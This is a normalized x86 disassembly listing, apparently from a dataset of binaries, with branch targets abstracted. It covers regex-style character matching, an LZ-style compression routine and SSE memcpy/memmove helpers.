mov ecx [ ebp + 0x8 ]
cmp al [ ecx ]
jne r-xdata
mov [ esi + 0x1d ] 0x1
xor al al
inc [ esi ]
mov al 0x1
jmp r-xdata
leave
retn 0x4
sub_423c2f
mov eax [ ecx ]
cmp eax [ ecx + 0x10 ]
jne r-xdata
mov dl [ eax ]
cmp dl [ esi ]
jne r-xdata
mov [ ecx + 0x1d ] 0x1
xor al al
retn
inc eax
mov [ ecx ] eax
mov al 0x1
retn
sub_423c49
mov ecx [ eax ]
cmp ecx [ eax + 0x10 ]
jne r-xdata
movzx edx [ ecx ]
push edi
mov edi [ eax + 0x2c ]
mov dx [ edi + edx * 2 + 0x8 ]
and dx [ esi + 0x2 ]
xor edi edi
cmp di dx
setne dl
pop edi
cmp [ esi ] dl
je r-xdata
mov [ eax + 0x1d ] 0x1
xor al al
retn
inc ecx
mov [ eax ] ecx
mov al 0x1
retn
sub_423c9a
push ebp
mov ebp esp
cmp eax [ ebp + 0x8 ]
je r-xdata
pop ebp
retn
movzx ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
movzx ecx [ edx + ecx * 2 ]
push esi
pop esi
add eax 0x2
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov dx [ eax ]
and dx cx
xor esi esi
cmp si dx
je r-xdata
sub_423cd3
push ebp
mov ebp esp
push ecx
mov ecx [ ebx ]
cmp ecx [ ebx + 0x10 ]
jne r-xdata
push esi
mov esi [ ebx + 0x2c ]
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
movzx eax [ ecx ]
push [ ebp - 0x4 ]
add esi 0x8
push eax
mov eax [ ebp + 0x8 ]
call sub_4205c5
pop edi
pop esi
test al al
je r-xdata
mov [ ebx + 0x1d ] 0x1
xor al al
inc [ ebx ]
mov al 0x1
jmp r-xdata
leave
retn 0x4
sub_423d11
push ebp
mov ebp esp
push ecx
mov ecx [ esi ]
cmp ecx [ esi + 0x10 ]
jne r-xdata
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
mov eax [ esi + 0x2c ]
push [ ebp - 0x4 ]
add eax 0x8
push eax
movzx eax [ ecx ]
push eax
mov eax [ ebp + 0x8 ]
call sub_420611
pop edi
test al al
je r-xdata
mov [ esi + 0x1d ] 0x1
xor al al
inc [ esi ]
mov al 0x1
jmp r-xdata
leave
retn 0x4
sub_423d77
push 0x4
mov eax sub_44ccfe
call sub_448595
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
call sub_44866d
retn 0x4
push edi
call sub_404720
mov eax [ edi + 0x1c ]
mov [ esi + 0x1c ] eax
sub_423db8
push ebp
mov ebp esp
push ecx
mov eax [ esi ]
cmp eax [ esi + 0x10 ]
jne r-xdata
mov al [ eax ]
mov [ ebp - 0x4 ] al
mov eax [ esi + 0x2c ]
mov ecx [ eax + 0x20c ]
push [ ebp - 0x4 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax al
call sub_411fdc
test al al
je r-xdata
mov [ esi + 0x1d ] 0x1
xor al al
leave
retn
inc [ esi ]
mov al 0x1
leave
retn
sub_423df3
mov eax [ esi ]
cmp eax [ esi + 0x10 ]
jne r-xdata
movzx eax [ eax ]
call sub_411fdc
test al al
je r-xdata
mov [ esi + 0x1d ] 0x1
xor al al
retn
inc [ esi ]
mov al 0x1
retn
sub_423e12
push ebp
mov ebp esp
push ecx
mov ecx [ ebx ]
cmp ecx [ ebx + 0x10 ]
jne r-xdata
push esi
mov esi [ ebx + 0x2c ]
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
movzx eax [ ecx ]
push [ ebp - 0x4 ]
add esi 0x8
push eax
mov eax [ ebp + 0x8 ]
call sub_4205c5
pop edi
pop esi
test al al
je r-xdata
mov [ ebx + 0x1d ] 0x1
xor al al
inc [ ebx ]
mov al 0x1
jmp r-xdata
leave
retn 0x4
sub_423e50
push ebp
mov ebp esp
push ecx
mov ecx [ esi ]
cmp ecx [ esi + 0x10 ]
jne r-xdata
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
mov eax [ esi + 0x2c ]
push [ ebp - 0x4 ]
add eax 0x8
push eax
movzx eax [ ecx ]
push eax
mov eax [ ebp + 0x8 ]
call sub_420611
pop edi
test al al
je r-xdata
mov [ esi + 0x1d ] 0x1
xor al al
inc [ esi ]
mov al 0x1
jmp r-xdata
leave
retn 0x4
sub_423ec0
push ebp
mov ebp esp
mov eax 0x5008
call sub_43c720
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov al [ esi ]
and al 0x2
sub al 0x2
movsx eax al
neg eax
sbb eax eax
and eax 0xfffffffd
add eax 0x4
push ebx
mov ebx ecx
lea ecx [ eax - 0x1 ]
cmp ecx 0x3
ja r-xdata
xor edx edx
mov edx [ eax + esi + 0x1 ]
jmp r-xdata
mov ecx 0x4
sub ecx eax
add ecx ecx
add ecx ecx
or eax 0xffffffff
add ecx ecx
shr eax cl
and eax edx
push eax
mov [ edi ] eax
call sub_424ff8
mov [ ebx ] eax
push eax
lea ebx [ ebp - 0x5008 ]
mov eax esi
call sub_4246b0
mov ecx [ ebp - 0x4 ]
add esp 0x8
mov [ edi ] eax
xor ecx ebp
xor eax eax
pop ebx
call sub_4247dc
mov esp ebp
pop ebp
retn
sub_423f40
push ebp
mov ebp esp
mov eax 0x900c
call sub_43c720
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx ecx
mov [ ebp - 0x900c ] eax
mov eax ebx
shr eax 0x1
add eax ebx
push eax
mov [ esi ] eax
call sub_424ff8
mov edx [ ebp - 0x900c ]
lea ecx [ ebp - 0x9008 ]
push ecx
push eax
push edi
mov [ edx ] eax
call sub_424600
mov ecx [ ebp - 0x4 ]
add esp 0x10
mov [ esi ] eax
xor ecx ebp
xor eax eax
pop ebx
call sub_4247dc
mov esp ebp
pop ebp
retn
sub_423fa0
cmp eax 0x9
ja r-xdata
or eax 0xffffffff
retn
jmp [ eax * 4 + jump_table_423fcc ]
mov eax 0x1
retn
mov eax 0x9004
retn
mov eax 0x5004
retn
xor eax eax
retn
mov eax 0x5
retn
sub_4240c0
mov al [ ecx ]
and al 0x2
sub al 0x2
movsx eax al
neg eax
sbb eax eax
and eax 0xfffffffd
add eax 0x4
lea edx [ eax - 0x1 ]
cmp edx 0x3
ja r-xdata
xor edx edx
mov edx [ eax + ecx + 0x1 ]
jmp r-xdata
mov ecx 0x4
sub ecx eax
add ecx ecx
add ecx ecx
or eax 0xffffffff
add ecx ecx
shr eax cl
and eax edx
retn
sub_424100
mov al [ ecx ]
and al 0x2
sub al 0x2
movsx eax al
neg eax
sbb eax eax
and eax 0xfffffffd
add eax 0x4
lea edx [ eax - 0x1 ]
cmp edx 0x3
ja r-xdata
xor edx edx
mov edx [ ecx + 0x1 ]
jmp r-xdata
mov ecx 0x4
sub ecx eax
add ecx ecx
add ecx ecx
or eax 0xffffffff
add ecx ecx
shr eax cl
and eax edx
retn
sub_4241a0
cmp [ ecx ] ebx
jae r-xdata
retn
push esi
inc [ ecx ]
mov edx [ ecx ]
mov esi [ edx ]
mov eax esi
shr eax 0xc
xor eax esi
and eax 0xfff
mov [ edi + eax * 4 ] edx
mov [ edi + eax + 0x4000 ] 0x1
cmp edx ebx
jb r-xdata
pop esi
sub_4241d0
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
lea edi [ eax + ecx - 0x1 ]
mov [ ebp - 0x8 ] esi
lea ecx [ edi - 0xa ]
add esi 0x4
mov [ ebp - 0x14 ] edi
mov ebx 0x80000000
mov [ ebp - 0x10 ] 0x0
cmp eax ecx
ja r-xdata
cmp eax edi
ja r-xdata
mov edx [ eax ]
mov ecx esi
sub ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
jmp r-xdata
test bl 0x1
jne r-xdata
test bl 0x1
je r-xdata
test bl 0x1
je r-xdata
sub esi [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
shr ebx 0x1
or ebx 0x80000000
mov [ edx ] ebx
mov eax 0x9
cmp esi 0x9
jl r-xdata
lea esp [ esp ]
lea ecx [ edi - 0x3 ]
cmp eax ecx
ja r-xdata
mov edx [ ebp - 0x8 ]
shr ebx 0x1
or ebx 0x80000000
mov [ edx ] ebx
mov [ ebp - 0x8 ] esi
add esi 0x4
mov ebx 0x80000000
mov edi [ ebp + 0x14 ]
mov ecx edx
shr ecx 0xc
xor ecx edx
and ecx 0xfff
mov edi [ edi + ecx * 8 + 0x4 ]
xor edi edx
mov [ ebp - 0x18 ] edi
test [ ebp - 0x18 ] 0xffffff
mov edi [ ebp + 0x14 ]
mov [ edi + ecx * 8 + 0x4 ] edx
mov edx edi
mov edi [ edx + ecx * 8 + 0x8 ]
lea edx [ edx + ecx * 8 + 0x8 ]
mov [ ebp - 0x1c ] edi
mov [ edx ] eax
jne r-xdata
mov edi [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
shr edi 0x1
add edi edx
cmp eax edi
jbe r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
shr ebx 0x1
test bl 0x1
je r-xdata
mov cl [ eax ]
mov [ esi ] cl
inc eax
inc esi
shr ebx 0x1
cmp eax edi
jbe r-xdata
mov edx [ eax ]
mov edi [ ebp + 0x14 ]
mov ecx edx
shr ecx 0xc
xor ecx edx
and ecx 0xfff
mov [ edi + ecx * 8 + 0x8 ] eax
mov [ edi + ecx * 8 + 0x4 ] edx
mov edi [ ebp - 0x14 ]
mov cl [ eax ]
mov edi 0x1
add [ ebp - 0x10 ] edi
add [ ebp - 0x4 ] edi
mov [ esi ] cl
add eax edi
add esi edi
shr ebx 0x1
test edi edi
je r-xdata
mov edx [ ebp - 0x8 ]
shr ebx 0x1
or ebx 0x80000000
mov [ ebp - 0x8 ] esi
add esi 0x4
mov [ edx ] ebx
mov edx [ eax ]
add ecx 0x4
mov [ ebp - 0x4 ] ecx
mov ebx 0x80000000
mov edi eax
sub edi edx
sar edi 0x5
mov edx eax
sub edx edi
sub edx [ ebp + 0x8 ]
cmp ecx edx
jg r-xdata
mov ecx [ ebp - 0x4 ]
mov edx eax
sub edx edi
cmp edx 0x2
jg r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
shr ebx 0x1
shl ecx 0x4
or ebx 0x80000000
cmp [ ebp - 0x18 ] 0x0
je r-xdata
inc edi
cmp eax edi
jne r-xdata
mov edx eax
sub edi edx
add eax 0x4
mov [ ebp - 0x10 ] edx
mov dl [ edi + eax ]
mov [ ebp - 0x1c ] edi
cmp dl [ eax ]
jne r-xdata
or ecx 0x1
mov [ esi ] cx
add eax 0x3
add esi 0x2
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
cmp [ ebp - 0x10 ] 0x3
jb r-xdata
mov edx eax
sub edx [ ebp - 0x10 ]
cmp edx 0x12
jae r-xdata
mov dl [ edi + eax + 0x1 ]
inc eax
cmp dl [ eax ]
jne r-xdata
mov edi [ ebp - 0x14 ]
mov edx [ eax ]
lea ecx [ edi - 0xa ]
cmp eax ecx
jbe r-xdata
mov edx [ ebp + 0x8 ]
add edx 0x3
cmp eax edx
jbe r-xdata
shl edx 0x10
or edx ecx
mov [ esi ] edx
add esi 0x3
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
add edx 0xfffffffe
or edx ecx
mov [ esi ] dx
add esi 0x2
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
add edx 0x2
mov [ ebp - 0x18 ] 0xff
cmp edx 0xff
ja r-xdata
mov dl [ eax - 0x3 ]
mov [ ebp - 0xc ] 0x6
mov dl [ edi + eax + 0x1 ]
inc eax
cmp dl [ eax ]
jne r-xdata
mov [ ebp - 0x18 ] edx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
dec [ ebp - 0xc ]
jne r-xdata
mov edi eax
sub edi [ ebp - 0x10 ]
mov edi [ ebp - 0x1c ]
mov edi [ ebp - 0xc ]
cmp [ eax + edi - 0x3 ] dl
jne r-xdata
mov edx [ ebp - 0x1c ]
mov dl [ edx + eax + 0x1 ]
inc eax
inc edi
cmp dl [ eax ]
je r-xdata
cmp edi [ ebp - 0x18 ]
jae r-xdata
sub_424470
push ebp
mov ebp esp
sub esp 0x14
mov cl [ eax ]
and cl 0x2
sub cl 0x2
movsx ecx cl
neg ecx
sbb ecx ecx
and ecx 0xfffffffd
lea eax [ eax + ecx * 2 + 0x9 ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
lea eax [ edx + ecx - 0x1 ]
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
push edi
mov eax 0x1
dec edx
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
test al 0x1
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
add ecx 0x4
mov [ ebp - 0x4 ] ecx
mov edi [ ebp - 0xc ]
add edi 0xfffffff6
cmp ebx edi
jae r-xdata
shr eax 0x1
mov [ ebp - 0x14 ] eax
mov eax ecx
shr eax 0x4
and eax 0xfff
and ecx 0xf
mov edi [ esi + eax * 4 ]
je r-xdata
mov edi [ ebp - 0xc ]
cmp ebx edi
ja r-xdata
mov edi eax
and edi 0xf
mov edi [ edi * 4 + r--data ]
add [ ebp - 0x4 ] edi
mov [ ebx ] ecx
mov ecx edi
add ebx edi
shr eax cl
lea ecx [ ebx - 0x3 ]
cmp edx ecx
jae r-xdata
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x2 ]
add eax 0x3
mov [ ebp - 0x4 ] eax
xor eax eax
sub edi ebx
mov [ ebp - 0x8 ] ecx
mov ecx ebx
mov [ ebp - 0x10 ] edi
jmp r-xdata
add [ ebp - 0x4 ] 0x2
add ecx 0x2
xor eax eax
sub edi ebx
mov [ ebp - 0x8 ] ecx
mov ecx ebx
mov [ ebp - 0x10 ] edi
jmp r-xdata
add edi 0xfffffffd
cmp edx edi
jae r-xdata
nop
cmp eax 0x1
jne r-xdata
lea ecx [ ecx ]
mov edi [ edi + ecx ]
mov [ ecx ] edi
mov edi [ ebp - 0x8 ]
add eax 0x3
add ecx 0x3
cmp eax edi
jb r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edx + 0x1 ]
inc edx
mov ecx eax
shr ecx 0xc
xor ecx eax
and ecx 0xfff
mov [ esi + ecx * 4 ] edx
mov [ esi + ecx + 0x4000 ] 0x1
cmp edx edi
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
inc [ ebp - 0x4 ]
mov [ ebx ] cl
inc ebx
shr eax 0x1
cmp ebx edi
jbe r-xdata
add [ ebp - 0x4 ] 0x4
mov eax 0x80000000
mov edi [ edx + 0x1 ]
inc edx
mov ecx edi
shr ecx 0xc
xor ecx edi
and ecx 0xfff
mov [ esi + ecx * 4 ] edx
mov [ esi + ecx + 0x4000 ] 0x1
lea ecx [ ebx - 0x3 ]
cmp edx ecx
jb r-xdata
jmp r-xdata
mov edi [ ebp - 0x10 ]
add ebx edi
mov eax ebx
sub eax edi
cmp edx eax
jae r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x14 ]
lea edx [ ebx - 0x1 ]
jmp r-xdata
mov edi [ edx + 0x1 ]
inc edx
mov ecx edi
shr ecx 0xc
xor ecx edi
and ecx 0xfff
mov [ esi + ecx * 4 ] edx
mov [ esi + ecx + 0x4000 ] 0x1
cmp edx eax
jb r-xdata
sub_424600
push ebp
mov ebp esp
test ebx ebx
je r-xdata
xor eax eax
pop ebp
retn
cmp ebx 0xfffffe6f
ja r-xdata
mov edx [ ebp + 0x10 ]
push esi
cmp ebx 0xd8
sbb esi esi
and esi 0xfffffffa
push edi
add esi 0x9
lea eax [ edx + 0x8 ]
mov ecx 0x1000
mov [ eax ] 0x0
add eax 0x8
dec ecx
jne r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push edx
lea edi [ esi + eax ]
push ebx
push edi
push ecx
call sub_4241d0
add eax esi
add esp 0x10
cmp eax esi
jne r-xdata
mov ecx 0x1
mov edx [ ebp + 0x8 ]
push ebx
push edx
push edi
call sub_4247f0
add esp 0xc
lea eax [ esi + ebx ]
xor ecx ecx
jmp r-xdata
or cl 0x2
mov [ edx ] cl
mov [ edx + 0x1 ] eax
mov [ edx + 0x5 ] ebx
or [ edx ] 0x44
pop ebp
retn
mov [ edx ] cl
or [ edx ] 0x44
mov [ edx + 0x1 ] al
mov [ edx + 0x2 ] bl
pop ebp
retn
mov edx [ ebp + 0x10 ]
pop edi
mov [ edx ] 0x0
mov edx [ ebp + 0xc ]
cmp esi 0x3
pop esi
jne r-xdata
sub_4246b0
push ebp
mov ebp esp
push ecx
mov dl [ eax ]
mov cl dl
and cl 0x2
sub cl 0x2
push esi
push edi
movsx edi cl
neg edi
sbb edi edi
and edi 0xfffffffd
add edi 0x4
lea ecx [ edi - 0x1 ]
cmp ecx 0x3
ja r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx [ edi + eax + 0x1 ]
mov [ ebp - 0x4 ] ecx
jmp r-xdata
lea edx [ eax + edi * 2 + 0x1 ]
mov eax [ ebp + 0x8 ]
push edx
push eax
call sub_4247f0
add esp 0xc
pop edi
mov eax esi
mov [ ebx + 0x5000 ] 0x0
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov esi ebx
call sub_424470
add esp 0x4
pop edi
mov [ ebx + 0x5000 ] 0x0
pop esi
mov esp ebp
pop ebp
retn
mov ecx 0x4
sub ecx edi
add ecx ecx
add ecx ecx
or esi 0xffffffff
add ecx ecx
shr esi cl
and esi [ ebp - 0x4 ]
push esi
test dl 0x1
je r-xdata
sub_4247f0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_424874 ]
jmp [ ecx * 4 + jump_table_4248f4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_424960 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_424afc ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_424a00 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_424afc ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_424960 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_424afc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_424960 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_424960 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_424960 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_424afc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_424afc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_424afc ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_424b60
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_424be4 ]
jmp [ ecx * 4 + jump_table_424c64 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_424cd0 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_424e6c ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_424d70 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_424e6c ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_424cd0 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
